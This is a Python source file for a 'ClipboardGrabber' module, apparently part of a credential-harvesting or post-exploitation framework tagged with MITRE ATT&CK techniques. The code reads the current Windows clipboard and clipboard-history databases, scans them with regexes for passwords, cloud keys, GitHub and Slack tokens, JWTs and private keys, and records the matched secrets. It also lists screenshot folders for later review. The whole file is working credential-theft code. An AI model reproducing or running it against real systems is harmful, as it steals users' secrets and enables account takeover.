"""
ClipboardGrabber — Extract secrets from clipboard history and screenshot caches

Targets:
- Windows Clipboard History: SQLite DB in Packages/Microsoft.Windows.ContentDeliveryManager
- Windows Clipboard: Direct read of current clipboard text via ctypes
- Screenshot caches (discovery only — flags paths for manual review)

Users frequently paste passwords, tokens, and connection strings.
Clipboard history persists across reboots on Windows 10+.

MITRE ATT&CK: T1115 (Clipboard Data)
"""

from __future__ import annotations

import os
import re

from .base import GrabberContext, GrabberModule
from .models import ExtractedCredential, GrabberResult, GrabberStatus, PrivilegeLevel
from .utils import safe_read_text, safe_sqlite_close, safe_sqlite_read

_SECRET_PATTERNS = [
    re.compile(p, re.IGNORECASE) for p in [
        r"(?:password|passwd|pwd)\s*[=:]\s*\S+",
        r"(?:api[_-]?key|token|secret)\s*[=:]\s*\S+",
        r"AKIA[0-9A-Z]{16}",
        r"-----BEGIN\s(?:RSA\s)?PRIVATE\sKEY-----",
        r"gh[ps]_[A-Za-z0-9_]{36,}",
        r"xox[bprs]-[0-9]{10,}",
        r"eyJ[A-Za-z0-9\-_]+\.eyJ[A-Za-z0-9\-_]+\.[A-Za-z0-9\-_]+",
        r"(?:Server|Data Source).*?(?:Password|Pwd)\s*=\s*[^;]+",
        r"mongodb(?:\+srv)?://[^@\s]+:[^@\s]+@",
    ]
]


class ClipboardGrabber(GrabberModule):
    name = "clipboard"
    description = "Extract secrets from clipboard history and current clipboard"
    min_privilege = PrivilegeLevel.USER
    supported_platforms = ("Windows",)
    default_enabled = True

    _CLIPBOARD_HISTORY_PATHS = [
        "{localappdata}/Microsoft/Windows/Clipboard/clipboard.sqlite",
        "{localappdata}/ConnectedDevicesPlatform",
    ]

    def preflight_check(self, context: GrabberContext) -> bool:
        return context.is_windows

    def execute(self, context: GrabberContext) -> GrabberResult:
        result = GrabberResult(module_name=self.name)

        # Current clipboard text
        clipboard_text = self._read_current_clipboard()
        if clipboard_text:
            creds = self._scan_for_secrets(clipboard_text, "Current Clipboard")
            result.credentials.extend(creds)
            if creds:
                result.findings.append(self.make_finding(
                    file_path="CLIPBOARD",
                    description=f"Found {len(creds)} secret(s) in current clipboard",
                    score=100,
                    matched_value="clipboard",
                ))

        # Clipboard history SQLite
        for template in self._CLIPBOARD_HISTORY_PATHS:
            path = template.format(localappdata=context.appdata_local or "")
            if os.path.isfile(path) and path.endswith(".sqlite"):
                creds = self._extract_clipboard_history(path)
                result.credentials.extend(creds)
                if creds:
                    result.findings.append(self.make_finding(
                        file_path=path,
                        description=f"Found {len(creds)} secret(s) in clipboard history",
                        score=75 * min(len(creds), 3),
                        matched_value="Clipboard History",
                    ))

        # Screenshot cache discovery
        screenshot_paths = self._find_screenshot_caches(context)
        for spath in screenshot_paths:
            result.credentials.append(ExtractedCredential(
                source_module=self.name,
                credential_type="token",
                target_application="Screenshot Cache",
                url=spath,
                notes="May contain screenshots of sensitive content — review manually",
                mitre_technique="T1113",
            ))

        result.status = GrabberStatus.COMPLETED
        return result

    @staticmethod
    def _read_current_clipboard() -> str:
        """Read current clipboard text on Windows via ctypes."""
        if os.name != "nt":
            return ""

        try:
            import ctypes

            user32 = ctypes.windll.user32
            kernel32 = ctypes.windll.kernel32

            if not user32.OpenClipboard(0):
                return ""

            try:
                # CF_UNICODETEXT = 13
                handle = user32.GetClipboardData(13)
                if not handle:
                    return ""

                ptr = kernel32.GlobalLock(handle)
                if not ptr:
                    return ""

                try:
                    text = ctypes.wstring_at(ptr)
                    return text[:10000]  # Cap at 10KB
                finally:
                    kernel32.GlobalUnlock(handle)
            finally:
                user32.CloseClipboard()

        except (AttributeError, OSError):
            return ""

    def _extract_clipboard_history(self, db_path: str) -> list[ExtractedCredential]:
        """Extract clipboard history entries and scan for secrets."""
        creds = []
        result = safe_sqlite_read(db_path)
        if not result:
            return creds

        conn, tmp_path = result
        try:
            # Schema varies by Windows version — try common table names
            for table in ("clipboard_items", "ClipboardItem", "items"):
                try:
                    cursor = conn.execute(f"SELECT * FROM {table} LIMIT 500")
                    for row in cursor:
                        # Try to extract text content from various column names
                        text = ""
                        for col in ("content", "text", "data", "Content", "Text"):
                            val = None
                            try:
                                val = row[col]
                            except (IndexError, KeyError):
                                continue
                            if isinstance(val, str):
                                text = val
                                break
                            elif isinstance(val, bytes):
                                text = val.decode("utf-8", errors="ignore")
                                break

                        if text:
                            found = self._scan_for_secrets(text, "Clipboard History")
                            creds.extend(found)
                    break
                except Exception:
                    continue
        finally:
            safe_sqlite_close(conn, tmp_path)

        return creds

    @staticmethod
    def _scan_for_secrets(text: str, source: str) -> list[ExtractedCredential]:
        """Scan text for credential patterns."""
        creds = []
        seen: set[str] = set()

        for pattern in _SECRET_PATTERNS:
            for match in pattern.finditer(text):
                value = match.group()
                if value in seen:
                    continue
                seen.add(value)
                creds.append(ExtractedCredential(
                    source_module="clipboard",
                    credential_type="password",
                    target_application=source,
                    decrypted_value=value[:200],
                    mitre_technique="T1115",
                ))

                if len(creds) >= 20:
                    return creds

        return creds

    @staticmethod
    def _find_screenshot_caches(context: GrabberContext) -> list[str]:
        """Discover screenshot/snip history locations."""
        paths = []
        candidates = [
            os.path.join(context.user_profile_path, "Pictures", "Screenshots"),
            os.path.join(context.user_profile_path, "Videos", "Captures"),
            os.path.join(context.appdata_local or "", "Packages",
                        "Microsoft.ScreenSketch_8wekyb3d8bbwe", "TempState"),
        ]
        for path in candidates:
            if os.path.isdir(path):
                try:
                    count = sum(1 for e in os.scandir(path) if e.is_file())
                    if count > 0:
                        paths.append(path)
                except OSError:
                    pass
        return paths
